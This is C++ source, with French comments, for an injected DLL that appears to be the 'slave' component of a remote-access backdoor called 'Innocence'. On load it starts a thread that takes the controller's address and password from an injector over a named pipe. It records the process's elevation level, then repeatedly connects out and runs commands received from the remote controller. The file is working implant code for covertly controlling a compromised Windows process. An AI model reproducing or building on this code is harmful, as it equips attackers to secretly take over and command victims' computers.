#include <windows.h>
HANDLE threadHandle;

#include <Innocence.hpp>
using namespace Innocence;

#include <common/Log.hpp>


#include <system/Uac.hpp>
#include <system/Process.hpp>
using namespace System;

#include "SlaveCore.hpp"

#include <network/Pipe.hpp>

// il faut récupérer  l'ip, le port, le mot de passe et le nom du client que va
// nous envoyer l'injecteur
// pour ce faire, on utilise les "pipe" à la windows (IPC)
ConnectionInfo getConnectionInfo()
{
	ConnectionInfo info;
	try
	{
		Network::Pipe pipe;
		pipe.connect(Innocence::PIPE_NAME);
		char blaspheme [CONNECTION_INFO_SIZE];
		pipe.recv(blaspheme, CONNECTION_INFO_SIZE);
		std::string buffer(blaspheme, CONNECTION_INFO_SIZE);
		size_t end = buffer.find_last_of(MARKER);
		buffer = buffer.substr(MARKER_SIZE, end+1-2*MARKER_SIZE);

		std::string port_buffer;
		std::istringstream iss(buffer);

		std::getline( iss, info.ip, SEPERATOR );
		std::getline( iss, port_buffer, SEPERATOR );
		std::getline( iss, info.name, SEPERATOR );
		std::getline( iss, info.password, SEPERATOR );

		fromString(port_buffer, info.port);
		pipe.disconnect();
	}
	catch(Network::PipeException&)
	{
//#ifndef INNOCENCE_DEBUG
//		throw;
//#else
		info.ip = "127.0.0.1";
		info.port = 80;
		info.password = "crunch";
		info.name = "default";
//#endif
	}
	return info;
}

DWORD WINAPI run(void)
{
	try
	{
		LOG.setIdentity(Innocence::identity);
		LOG.addObserver(new Common::LogToConsole);
		LOG.addObserver(new Common::LogToCollector);
		ConnectionInfo info = getConnectionInfo();	    
		
		Inhibition::SlaveCore slave(info);
		LOG << GetElevationType();
		LOG << "Trying connection on " + slave.getConnection().ip + ":" + toString(slave.getConnection().port);
		while(!slave.exiting())
		{
			try
			{
				if(slave.connect())
				{
					LOG << "Session started";
					while(slave.process_command());
					LOG << "Session ended";
					slave.disconnect();
				}
				Sleep(500);
			}
			catch(Network::Deconnection&)
			{
				LOG << "Untimely disconnect";
				slave.disconnect();
			}
		}
	}
	catch(Common::Exception&)
	{
	}
	CATCH_UNKNOWN_EXCEPTION
	
    System::Process::This thisProcess;
	thisProcess.killHierarchy();
	return EXIT_SUCCESS;
}

extern "C" BOOL APIENTRY DllMain (HINSTANCE hModule, DWORD dwMsg, LPVOID lpReserved)
{
    UNREFERENCED_PARAMETER( hModule );
    UNREFERENCED_PARAMETER( lpReserved );

    switch( dwMsg )
    {
		case DLL_PROCESS_ATTACH:
			DisableThreadLibraryCalls( hModule );
			threadHandle = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)run, NULL, 0, 0 );
			return (!threadHandle) ? FALSE : TRUE;
		case DLL_PROCESS_DETACH:
			TerminateThread(threadHandle, EXIT_SUCCESS);
			return TRUE;
    }
    return TRUE;
}
